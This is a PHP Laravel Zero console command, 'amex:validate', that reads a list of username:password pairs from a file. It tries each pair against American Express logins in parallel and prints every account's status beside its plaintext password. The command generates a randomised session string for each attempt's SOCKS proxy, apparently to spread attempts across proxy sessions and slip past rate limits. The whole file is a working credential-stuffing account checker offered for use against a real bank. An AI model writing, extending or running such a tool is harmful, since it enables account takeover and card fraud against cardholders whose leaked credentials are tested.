<?php

namespace App\Commands\Amex;

use App\Services\Amex\Amex;
use App\Services\Amex\Enums\LoginStatus;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\File;
use LaravelZero\Framework\Commands\Command;
use Spatie\Fork\Fork;
use function Termwind\render;

class AccountCheckCommand extends Command
{
    protected $signature = 'amex:validate 
        {--accountList=list.txt : Path to the file containing the list of Amex accounts to validate} 
        {--proxy= : Proxy configuration to use. Use [random(length)] to generate a random string. Example: socks5://user-s-[random(10)]:pass@host:port}
        {--threadCount=10 : Number of concurrent threads to use during validation}';

    protected $description = 'Performs a bulk validation of Amex accounts. Validates if each account in the provided list is a legitimate Amex account.';

    public function handle(): void
    {
        $accountListFilePath = $this->option(key: 'accountList');
        $accountCollection = $this->parseAccountListFromFile(listFilePath: $accountListFilePath);

        render(html: '<div class="pl-2 py-2 text-green-300">Initiating the process to validate Amex accounts...</div>');

        Fork::new()
            ->concurrent(concurrent: (int) $this->option(key: 'threadCount'))
            ->run(...$this->prepareValidationTasks(accountCollection: $accountCollection));

        render(html: '<div class="pl-2 py-2 text-green-300">Finished validating Amex accounts.</div>');
    }

    protected function parseAccountListFromFile(string $listFilePath): Collection
    {
        return collect(
            value: (array) File::lines(path: $listFilePath)
                ->map(callback: fn ($line) => explode(separator: ':', string: $line))
                ->filter(callback: fn ($accountParts) => count(value: $accountParts) === 2)
                ->map(callback: fn ($accountParts) => [
                    'user_id' => $accountParts[0] ?? null,
                    'password' => $accountParts[1] ?? null,
                ])
                ->filter(callback: fn ($account) => $account['user_id'] !== null && $account['password'] !== null)
                ->toArray()
        );
    }

    protected function prepareValidationTasks(Collection $accountCollection): array
    {
        return $accountCollection->map(callback: fn ($account) => function () use ($account) {
            $proxy = $this->option('proxy') ? $this->generateRandomProxy(input: $this->option('proxy')) : null;

            $amexService = new Amex(
                user_id: $account['user_id'],
                password: $account['password'],
                proxy: $proxy
            );

            $startTime = microtime(true);

            $validationResult = $amexService->handle();

            /**
             * @var LoginStatus $validationStatus
             */
            $validationStatus = $validationResult['status'];

            $executionTime = microtime(true) - $startTime;

            $htmlOutput = <<<HTML
                <div class="space-x-2 pl-2">
                    <span class="{$validationStatus->getTextColor()} w-8">{$validationStatus->getStatusText()}</span>
                    <span class="text-gray-500 w-24">{$account['user_id']}</span>
                    <span class="text-gray-500 w-24">{$account['password']}</span>
                    <span class="text-yellow-500">{$proxy} ({$executionTime} second)</span>
                    <span>{$validationResult['message']}</span>
                </div>
            HTML;

            render(html: $htmlOutput);
        })->toArray();
    }

    protected function generateRandomProxy(string $input): string
    {
        return (string) preg_replace_callback(
            pattern: '/\[random\(([0-9]+)\)]/',
            callback: fn ($matches) => bin2hex(string: random_bytes(length: (int) $matches[1])),
            subject: $input
        );
    }
}
